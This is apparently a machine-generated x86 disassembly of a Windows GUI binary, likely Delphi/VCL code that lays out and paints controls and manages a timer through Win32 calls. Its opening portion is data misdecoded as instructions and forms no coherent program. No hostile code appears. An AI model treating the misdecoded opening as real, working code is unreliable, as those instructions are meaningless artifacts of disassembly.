inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
cdq
stc
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
test eax 0x48ff0001
stc
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ eax ] al
mov eax [ ebp ]
jl r-xdata
je r-xdata
inc esp
adc [ eax ] al
0x20ff0000 0x4491
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
jo r-xdata
add bh bh
pop [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
add bh bh
and [ ecx ] al
add bh bh
xor [ eax + 0x44 ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f070025 ] al
outsb
inc ebx
add ah dh
stc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc esp
add [ ecx + edi * 8 + 0x44 ] dh
add [ eax ] al
sbb [ ecx ] 0x0
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
sbb al 0x0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
js r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
push ebx
loopne r-xdata
inc edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
push eax
outsd
jo r-xdata
xchg ecx eax
sbb al [ eax ]
push cs
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al ch
push 0x8bffff15
inc ebp
jb r-xdata
je r-xdata
sub [ 0x6e4f0b00 ] 0x53
inc ecx
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
inc ebp
loopne r-xdata
inc esp
outsd
push ebx
je r-xdata
jb r-xdata
[ eax ] al
inc edx
inc esp
add al ch
add [ eax ] al
arpl [ ebx - 0x74 ] bp
inc edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
inc ebx
add al 0x89
inc ebp
in al 0x8b
inc ebp
clc
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
jb r-xdata
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
dec [ ebx + 0x508b0845 ]
or al 0x8b
inc ebp
or [ ebx + 0x408bf840 ] cl
adc al ch
push ds
adc eax 0x4dffffff
inc esp
jb r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
mov ecx 0x2
call sub_424fa8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424758
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424fa8
pop ebx
mov esp ebp
pop ebp
retn
fmul [ ebx + 0x408b0845 ]
clc
lea eax [ bx + si ]
outsd
arpl [ ebx - 0x2c ] bp
inc esp
inc esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
popad
inc esp
jb r-xdata
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
inc edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
jo r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
and [ 0x6e4f0700 ] 0x43
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
inc ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
sub_4331b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424fa8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424758
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424fa8
pop ebx
mov esp ebp
pop ebp
retn
sub_43327c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424864
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_4331b8
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_4332dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450a00
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4272b4
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_433720
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_40333c
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_448764
mov edx 0x69
mov eax ebx
call sub_448740
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_433374
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450a5c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4333c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_4278e4
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_4278fc
mov edi eax
mov eax ebx
call sub_4489b0
mov [ esp ] eax
mov eax ebx
call sub_4489f4
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402938
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402938
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402938
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402938
mov esi eax
jmp r-xdata
sub_4334ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_43359d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4333c0
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_42503c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4335a4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_424834
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_424b54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_424fe0
sub_4335ac
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_4607d8
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_44fadc
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_44f7d8
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_44a198
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_433644
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_4335ac
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_433720
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_4278e4
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4278fc
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_4333c0
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4278e4
push eax
mov eax [ ebx + 0x168 ]
call sub_4278fc
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_4335ac
test al al
je r-xdata
sub_433848
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_4278e4
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4278e4
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_4278fc
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4278fc
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_4338b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420d38
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_433938
call sub_421e98
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_433900
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4339ac
mov eax [ esi + 0x34 ]
call sub_421f4c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d84
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_433938
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_433972
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4339ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_433a2b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433a32
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
sub_433a84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451480
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43c760
call sub_43c840
test al al
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov edx 0xb9
mov eax esi
call sub_448740
mov edx 0x29
mov eax esi
call sub_448764
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_433ed4
mov edx 0x1
mov eax esi
call sub_433ef0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_44914c
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_44fa6c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_433b48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c664
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_433bb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44edf0
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44cd78
sub_433bf8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433ce8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_448fac
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44dcb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433cef
lea eax [ ebp - 0x14 ]
call sub_403eb8
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call InvalidateRect
sub_433cf8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_433d30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_433e92
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_43327c
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_433cf8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_43327c
mov esi [ ebx + 0x208 ]
call sub_43c760
call sub_43c840
test al al
je r-xdata
push ebp
call sub_433cf8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_43327c
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_424e6c
mov eax ebx
call sub_4509b8
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_44b2c4
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x1c ]
call sub_404378
push eax
mov eax esi
call sub_425280
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433e99
lea eax [ ebp - 0x1c ]
call sub_403eb8
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424b54
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_42517c
mov edx r-xdata
mov eax esi
call sub_4250d8
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_433f44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b844
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_433f9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e46c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_4340bd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e46c
call sub_4039a0
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_448764
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
